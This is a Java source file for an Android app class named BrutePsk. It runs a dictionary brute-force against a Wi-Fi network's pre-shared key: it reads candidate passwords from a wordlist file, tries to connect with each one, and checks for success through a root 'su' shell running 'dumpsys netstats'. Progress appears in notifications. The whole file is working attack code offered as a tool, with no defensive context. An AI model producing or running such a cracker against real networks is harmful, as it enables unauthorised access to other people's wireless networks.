package com.opx.yourdemon.wifi.utils;


import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.widget.TextView;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.opx.yourdemon.MainActivity;
import com.opx.yourdemon.R;
import com.opx.yourdemon.custom.WiFINetwork;
import com.opx.yourdemon.utils.Core;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;

public class BrutePsk {
    public Activity mActivity;
    public TextView prog;
    public String ssid;
    public Core core;
    public int netid = 0;
    public boolean canceled = false;
    public int i = 0;
    public String path;

    public BrutePsk(Activity activity, TextView per, String s, Core c, String p) {
        mActivity = activity;
        prog = per;
        ssid = s;
        core = c;
        path = p;
    }

    public WiFINetwork execute() {
        WiFINetwork result = new WiFINetwork();
        try (BufferedReader br = new BufferedReader(new FileReader(path))) {
            String psk;
            while ((psk = br.readLine()) != null) {
                if (canceled) {
                    break;
                }
                i++;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    CreateNotification(mActivity.getString(R.string.trying) + psk, 0, 1);
                }
                String finalPsk = psk;
                mActivity.runOnUiThread(() -> prog.setText(mActivity.getString(R.string.trying) + finalPsk));
                netid = core.connectWiFi2(ssid, psk);
                try {
                    Thread.sleep(6000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                if (checkssid()) {
                    result.setOK(true);
                    result.setPsk(psk);
                    result.setSsid(ssid);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        CreateNotification(mActivity.getString(R.string.succes) + psk, 1, 1);
                    }
                    break;
                } else {
                    core.delwifi(netid);
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result;
    }

    public void kill() {
        canceled = true;
    }

    public boolean checkssid() {
        String line;
        boolean result = false;
        try {
            Process process = Runtime.getRuntime().exec("su");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();
            stdin.write(("dumpsys netstats | grep wlan" + '\n').getBytes());
            stdin.write(("exit\n").getBytes());
            stdin.flush();
            stdin.close();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            while ((line = br.readLine()) != null) {
                if (line.contains(ssid)) {
                    result = true;
                }
            }
            br.close();
            br = new BufferedReader(new InputStreamReader(stderr));
            while ((line = br.readLine()) != null) {
            }
            br.close();
            process.waitFor();
            process.destroy();
        } catch (IOException e) {
        } catch (InterruptedException ex) {
        }
        return result;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public void CreateNotification(String key, int prog, int max) {
        Intent intent = new Intent(core.getContext2(), MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(core.getContext2(), 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
        String CHANNEL_ID = "BruteForce PSK";
        NotificationChannel notificationChannel = new NotificationChannel(CHANNEL_ID, "BruteForce PSK", NotificationManager.IMPORTANCE_LOW);

        NotificationCompat.Builder b = new NotificationCompat.Builder(core.getContext2());

        b.setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL)
                .setWhen(System.currentTimeMillis())
                .setSmallIcon(R.drawable.iconnotif)
                .setTicker("Brute")
                .setContentTitle(key)
                .setChannelId(CHANNEL_ID)
                .setDefaults(Notification.DEFAULT_LIGHTS | Notification.DEFAULT_SOUND)
                .setContentIntent(contentIntent)
                .setProgress(max, prog, false)
                .setContentInfo("Info");

        NotificationManager notificationManager = (NotificationManager) core.getContext2().getSystemService(Context.NOTIFICATION_SERVICE);
        notificationManager.createNotificationChannel(notificationChannel);
        notificationManager.notify(5, b.build());
    }
}
